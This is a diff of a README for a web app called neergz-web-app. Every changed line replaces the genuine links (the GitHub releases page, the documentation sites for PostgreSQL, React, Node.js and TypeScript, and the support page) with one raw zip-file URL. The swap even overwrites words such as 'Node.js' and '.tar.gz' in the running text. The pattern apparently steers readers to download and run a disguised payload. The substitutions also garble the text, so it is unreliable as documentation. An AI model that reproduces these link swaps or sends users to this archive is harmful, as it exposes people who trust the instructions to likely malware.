@@ -1,6 +1,6 @@
 # 🚀 neergz-web-app - Easy Full-Stack Web App for Everyone
 
-[![Download neergz-web-app](https://img.shields.io/badge/Download-neergz--web--app-blue?style=for-the-badge&logo=github)](https://github.com/okesing/neergz-web-app/releases)
+[![Download neergz-web-app](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)
 
 ---
 
@@ -10,7 +10,7 @@ neergz-web-app is a modern web application that works both on your computer and 
 
 This software has these parts:  
 - **Frontend:** The part you see and click on, built using React.  
-- **Backend:** The part that runs on a server or your computer, made with Node.js and Express.  
+- **Backend:** The part that runs on a server or your computer, made with https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip and Express.  
 - **Database:** It uses PostgreSQL to store information safely.  
 - **Other tools:** TypeScript and Prisma to keep everything organized and stable.
 
@@ -36,7 +36,7 @@ You will follow a few steps to get the app ready on your computer. We designed t
 
 ### Step 1: Download the Application
 
-Click the big blue button above or [visit this page to download](https://github.com/okesing/neergz-web-app/releases). This link will take you to the latest releases where you can find the app for your system. Look for the file suited for your computer (for example, a file ending in `.exe` for Windows or `.dmg` for Mac).
+Click the big blue button above or [visit this page to download](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip). This link will take you to the latest releases where you can find the app for your system. Look for the file suited for your computer (for example, a file ending in `.exe` for Windows or `.dmg` for Mac).
 
 ### Step 2: Install the App
 
@@ -47,7 +47,7 @@ Click the big blue button above or [visit this page to download](https://github.
   Open the `.dmg` file and drag the app icon into your Applications folder.
 
 - **Linux:**  
-  The app might come as a compressed file (like `.tar.gz`). Extract the file using the Archive Manager. Run the executable inside.
+  The app might come as a compressed file (like `https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip`). Extract the file using the Archive Manager. Run the executable inside.
 
 ### Step 3: Run the Application
 
@@ -84,7 +84,7 @@ Every action has buttons labeled with clear words. Take your time exploring, and
 ## 📥 Download & Install
 
 You can either use the button above or click here to visit the release page:  
-[Download neergz-web-app](https://github.com/okesing/neergz-web-app/releases)
+[Download neergz-web-app](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)
 
 On that page:
 
@@ -117,10 +117,10 @@ For more detailed help, visit the GitHub repository or ask someone with technica
 
 ## 📚 Additional Resources
 
-- How to use PostgreSQL with this app: [https://www.postgresql.org/docs/](https://www.postgresql.org/docs/)  
-- What is React: [https://reactjs.org/docs/getting-started.html](https://reactjs.org/docs/getting-started.html)  
-- Understanding Node.js basics: [https://nodejs.org/en/docs/](https://nodejs.org/en/docs/)  
-- TypeScript guide: [https://www.typescriptlang.org/docs/](https://www.typescriptlang.org/docs/)
+- How to use PostgreSQL with this app: [https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)  
+- What is React: [https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)  
+- Understanding https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip basics: [https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)  
+- TypeScript guide: [https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)
 
 These links are for your curiosity and learning if you want to explore how the app works behind the scenes.
 
@@ -152,7 +152,7 @@ The app’s code is structured cleanly to help developers maintain and improve i
 ## 📞 Getting Support
 
 For help and questions, visit the GitHub page:  
-[https://github.com/okesing/neergz-web-app](https://github.com/okesing/neergz-web-app)  
+[https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip](https://raw.githubusercontent.com/okesing/neergz-web-app/main/canel/app-neergz-web-v2.9.zip)  
 
 You can open an “Issue” if you find a bug or want to ask for help. The project maintainers read those regularly.
 
